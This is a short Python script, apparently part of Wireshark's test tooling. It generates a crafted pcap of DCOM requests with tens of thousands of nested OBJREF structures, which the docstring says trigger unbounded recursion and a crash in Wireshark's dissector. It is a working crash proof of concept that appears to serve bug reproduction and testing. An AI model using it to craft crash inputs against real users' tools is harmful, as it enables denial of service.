#!/usr/bin/env python3
# Helper module for the dcom capture generator
#
# Wireshark - Network traffic analyzer
# By Gerald Combs <gerald@wireshark.org>
# Copyright 1998 Gerald Combs
#
# SPDX-License-Identifier: GPL-2.0-or-later
"""ISystemActivator RemoteGetClassObject (opnum 3) request whose interface
pointer holds an OBJREF_CUSTOM with iid=IID_IStorage.  dissect_dcom_CUSTOBJREF
(packet-dcom.c) calls the routine registered for the iid; sysact registers
dissect_dcom_IStorage for IID_IStorage, which calls dissect_dcom_OBJREF again.
Nest N such 48-byte OBJREFs: unbounded C recursion with no
increment_dissection_depth().  Usage: dcom_objref_recursion.py [N] [out]"""
import struct
import sys
from dcom_lib import (
    call_frag, guid_le, IID_ISTORAGE, NULL_GUID, orpcthis, pcap, RPC, TCP, UUID_ISYSACT,
)

N = int(sys.argv[1]) if len(sys.argv) > 1 else 40000
out = sys.argv[2] if len(sys.argv) > 2 else 'dcom_objref_recursion.pcap'

one = struct.pack('<II', 0x574f454d, 4) + guid_le(IID_ISTORAGE) + guid_le(NULL_GUID) + struct.pack('<II', 0, 0)
objref = one * N + struct.pack('<II', 0x574f454d, 0) + guid_le(NULL_GUID)
req = orpcthis() + struct.pack('<III', 0x00020000, len(objref), len(objref)) + objref

frames = []
t = TCP(frames, 50411, sport=135)
r = RPC(t, uuid=UUID_ISYSACT, ver=(0, 0))
r.bind()
call_frag(r, 3, req)
t.fin()
pcap(out, frames)
